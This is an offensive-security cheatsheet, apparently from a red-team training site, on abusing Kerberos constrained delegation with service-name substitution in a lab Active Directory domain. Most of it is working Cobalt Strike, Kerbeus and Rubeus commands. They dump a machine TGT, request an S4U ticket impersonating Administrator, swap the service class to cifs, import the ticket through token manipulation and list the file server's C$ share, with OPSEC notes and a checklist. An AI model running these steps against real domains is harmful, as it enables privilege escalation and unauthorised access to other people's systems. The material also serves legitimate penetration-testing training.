---
title: "Kerberos Service Name Substitution (altservice)"
description: "Use an allowed delegated SPN and substitute its service class when the destination service shares the same account key, with BOF and Rubeus examples."
category: "Kerberos"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF"]
updated: 2026-11-15
tags: ["kerberos", "delegation", "altservice", "s4u"]
draft: false
---

## 1. Why the attack works

A service ticket's outer service name is outside its encrypted ticket body. In the lab, an issued ticket can be retargeted from `time/lon-fs-1` to `cifs/lon-fs-1` without decrypting that body, because both services use the same computer account key.

**The shared account/key is the condition that matters.** A matching hostname alone is insufficient when a service runs under a different account. Service behavior and ticket validation also affect acceptance. Substitution does not rewrite the encrypted client identity, forge a new PAC, or grant extra user permissions.

| Parameter | Role |
|---|---|
| `/msdsspn` in Rubeus, `/service` in Kerbeus | Original SPN actually allowed by delegation |
| `/altservice:cifs` | Locally substitute the service class in the resulting ticket |
| `/ticket` | TGT of the controlled front-end account |
| `/impersonateuser` | Eligible client identity used for the protocol-transition example |

## 2. Confirm delegation and service identity

```shell
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
# Lab: LON-WS-1$ -> time/lon-fs-1
beacon> ldapsearch (&(samAccountType=805306369)(samAccountName=lon-fs-1$)) --attributes samAccountName,servicePrincipalName
```

Review which account owns the original and replacement services. Windows HOST service-class mappings may cover service names that are not explicitly listed as separate SPNs, so do not treat the literal absence of `cifs` in this output as a conclusive failure.

The example assumes protocol transition is enabled, the impersonated user can be delegated, and an elevated Beacon is already available on `lon-ws-1`.

```powershell
[Convert]::ToBoolean(<UAC_VALUE> -band 16777216)
```

## 3. Request the allowed service, then substitute

```shell
beacon> krb_dump /luid:3e7 /service:krbtgt
# Retain the TGT for LON-WS-1$.
# OPSEC Alternative
beacon> krb_s4u /ticket:<FRONTEND_TGT_BASE64> /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
# Expected final SPN: cifs/lon-fs-1
```

Rubeus alternative from the same lab:

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-fs-1 /altservice:cifs /ticket:<FRONTEND_TGT_BASE64> /impersonateuser:Administrator /nowrap
```

Keep the **original** `time` SPN in `/msdsspn`: requesting an unlisted `cifs` SPN directly is not equivalent. `/altservice` changes the resulting ticket locally; it does not modify the directory's delegation configuration.

The challenge notes use the same idea with `LON-WKSTN-1$`, an allowed `ldap/lon-dc-1` SPN, and substitution to `cifs`. LDAP is not inherently read-only: its usefulness depends on the authenticated identity's permissions. In that challenge, CIFS is simply the service needed for the intended file access.

## Use the resulting service ticket

Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
# Record ProcessID and verify that ticket import succeeded.
beacon> steal_token <PID>
beacon> run klist
# Client: Administrator @ CONTOSO.COM
# Server: cifs/lon-fs-1 @ CONTOSO.COM
beacon> ls \\lon-fs-1\c$
```

A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
beacon> ls \\lon-fs-1\c$
```

## Session cleanup

Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.

```shell
# Native cleanup
beacon> kerberos_ticket_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <PID>
```

## Troubleshooting

| Symptom | Check |
|---|---|
| S4U2proxy rejected | Original SPN, protocol-transition/evidence requirements and user restrictions |
| Modified ticket cannot be decrypted | Services may use different account keys |
| Ticket accepted but access denied | Impersonated user's authorization on the target |
| Wrong host in `klist` | Preserve the target hostname; changing only the class does not move the service to another computer |

## Quick checklist

```text
ENUMERATE AND SUBSTITUTE
[ ] Read the original SPN from msDS-AllowedToDelegateTo.
[ ] Verify that original and replacement services use the same account key.
[ ] Check protocol-transition requirements or obtain a suitable evidence ticket.
[ ] Extract and verify the controlled front-end TGT.
[ ] krb_s4u /ticket:<FRONTEND_TGT_BASE64> /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
[ ] Rubeus alternative: s4u /user:lon-ws-1$ /msdsspn:time/lon-fs-1 /altservice:cifs /ticket:<FRONTEND_TGT_BASE64> /impersonateuser:Administrator /nowrap.
[ ] Keep the allowed original SPN in the request; substitute the final ticket's service class.
[ ] Confirm the final client and cifs/lon-fs-1 target before importing.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-fs-1\c$ -> verify actual service authorization.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
```

## MITRE ATT&CK

The links below describe the mapped steps, not a dedicated ATT&CK sub-technique named after this delegation configuration.

| Behavior in this guide | ATT&CK reference |
|---|---|
| Reusing the resulting Kerberos ticket | [T1550.003 — Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/) |

## Related references

- [Constrained delegation](/cheatsheets/kerberos-constrained-delegation-cheatsheet/)
- [S4U2self computer takeover](/cheatsheets/kerberos-s4u2self-computer-takeover-cheatsheet/)
- [Rubeus S4U and altservice](https://github.com/GhostPack/Rubeus#s4u)
